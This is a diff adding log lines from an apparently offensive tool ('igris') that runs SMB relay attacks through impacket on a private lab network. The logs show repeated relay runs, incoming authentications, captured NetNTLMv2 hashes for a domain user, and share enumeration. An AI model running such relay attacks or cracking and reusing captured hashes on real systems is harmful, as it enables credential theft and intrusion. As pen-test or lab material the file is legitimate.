@@ -311,3 +311,118 @@
 2021-10-04 18:22:47.541 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
 2021-10-04 18:22:50.306 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,50279)
 2021-10-04 18:22:50.307 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-05 15:25:18.135 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:25:18.159 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:25:53.203 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:25:53.205 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:25:53.249 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:25:53.359 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:25:53.370 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:26:55.764 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:26:55.765 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:26:55.797 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:26:55.798 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:26:55.799 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:28:22.354 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:28:22.356 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:28:22.391 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:28:22.394 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:28:22.395 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:28:30.973 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49807)
+2021-10-05 15:28:30.997 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:28:30.998 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:28:30.999 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:61e5fa205a9ee62efdfd55057066ad9f:010100000000000000a361a6fdb9d70106cae29fcf465f1e000000000100100068006d004c006a0057004300550043000300100068006d004c006a005700430055004300020010004400730044006d006700440072006a00040010004400730044006d006700440072006a000700080000a361a6fdb9d701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a0010000000000000000000000000000000000009001c0063006900660073002f006c006f006c002e006c006f00630061006c000000000000000000
+2021-10-05 15:28:31.028 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-05 15:28:31.044 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-05 15:28:31.123 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:28:41.729 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-05 15:28:41.732 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,49807)
+2021-10-05 15:28:41.732 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-05 15:29:31.331 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:29:31.331 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:29:31.346 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:29:31.347 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:29:31.347 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:29:43.762 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49813)
+2021-10-05 15:29:43.774 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:29:43.774 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:29:43.775 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:f9fbbd117248cab158e1cb4cc5f12876:0101000000000000808de4d1fdb9d701393a503577ee01e20000000001001000670061006800610046005000450064000300100067006100680061004600500045006400020010007100780041004b006a004b0066006800040010007100780041004b006a004b006600680007000800808de4d1fdb9d701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a0010000000000000000000000000000000000009001c0063006900660073002f006c006f006c002e006c006f00630061006c000000000000000000
+2021-10-05 15:29:43.836 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:29:53.474 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:29:54.900 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:29:57.675 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49829)
+2021-10-05 15:29:57.684 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:29:57.684 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:29:57.684 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:4f36fd6e5ebbad714dc9d79d44d8825e:010100000000000080c83cdafdb9d7018090524eafac75020000000001001000670061006800610046005000450064000300100067006100680061004600500045006400020010007100780041004b006a004b0066006800040010007100780041004b006a004b00660068000700080080c83cdafdb9d701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-05 15:29:57.711 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-05 15:29:57.730 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-05 15:29:57.767 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:30:10.252 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-05 15:30:10.257 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,49813)
+2021-10-05 15:30:10.258 | INFO     | impacket.smbserver:log:4132 - Remaining connections ['Thread-9']
+2021-10-05 15:30:10.261 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-05 15:30:10.266 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,49829)
+2021-10-05 15:30:10.266 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-05 15:34:31.417 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:34:31.418 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:34:31.451 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:34:31.452 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:34:31.453 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:34:37.406 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49842)
+2021-10-05 15:34:37.420 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:34:37.420 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:34:37.420 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:055da5beecb7dd63820aecdb746a9ad6:010100000000000080642181feb9d7018a7c6225e72107f800000000010010005200690057005a0058006c0072006600030010005200690057005a0058006c00720066000200100062005900720047004b006e00750073000400100062005900720047004b006e00750073000700080080642181feb9d701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a001000000000000000000000000000000000000900200063006900660073002f0070006f00630068006f002e006c006f00630061006c000000000000000000
+2021-10-05 15:34:37.444 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:34:54.133 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-05 15:34:54.714 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,49842)
+2021-10-05 15:34:54.714 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-05 15:37:38.979 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:51 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:37:38.980 | INFO     | project.igris:show_settable_variables_necessary:205 - Showing necessary settable variables
+2021-10-05 15:54:15.066 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:53 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:54:15.068 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:56:55.465 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:53 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:56:55.465 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:56:55.493 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:56:55.496 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:56:55.497 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:57:03.566 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49884)
+2021-10-05 15:57:03.590 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:57:03.590 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:57:03.590 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:2c2b1c3b7129339bf468a9afb49718d2:010100000000000080b168a301bad701d220d204d25947b40000000001001000660070004900730048005000500063000300100066007000490073004800500050006300020010006f00680046006a006f00580045005300040010006f00680046006a006f005800450053000700080080b168a301bad701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a0010000000000000000000000000000000000009001a0063006900660073002f006a0065002e006c006f00630061006c000000000000000000
+2021-10-05 15:57:03.613 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-05 15:57:03.633 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-05 15:57:03.667 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:57:14.343 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
+2021-10-05 15:57:14.350 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.129,49884)
+2021-10-05 15:57:14.351 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
+2021-10-05 15:58:33.041 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:53 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:58:33.041 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-05 15:58:33.052 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-05 15:58:33.053 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-05 15:58:33.055 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-10-05 15:59:15.324 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.129,49896)
+2021-10-05 15:59:15.336 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
+2021-10-05 15:59:15.336 | INFO     | impacket.smbserver:log:4132 - User PC-ALEX\apuia authenticated successfully
+2021-10-05 15:59:15.336 | INFO     | impacket.smbserver:log:4132 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:0e764e9d28f94e4db32ff890c5e97403:0101000000000000804b16f201bad701784b8c7d643e7b6900000000010010005a005200690049004500460047006300030010005a005200690049004500460047006300020010004100790074006b006200580041005400040010004100790074006b00620058004100540007000800804b16f201bad701060004000200000008003000300000000000000001000000002000003df63b2b902416e7d8e161b2cdafac1b4d365e070e99c063397c4e66cc504bda0a001000000000000000000000000000000000000900220063006900660073002f006d00650065006500650065002e006c006f00630061006c000000000000000000
+2021-10-05 15:59:15.352 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
+2021-10-05 15:59:15.367 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
+2021-10-05 15:59:15.399 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
+2021-10-05 15:59:40.838 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:53 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-05 15:59:40.838 | INFO     | project.igris:show_settable_variables_necessary:205 - Showing necessary settable variables
+2021-10-06 13:11:47.683 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:64 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
+            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
+2021-10-06 13:11:48.023 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
+2021-10-06 13:11:48.039 | INFO     | impacket.smbserver:log:4132 - Config file parsed
+2021-10-06 13:11:48.040 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-10-06 13:11:48.040 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
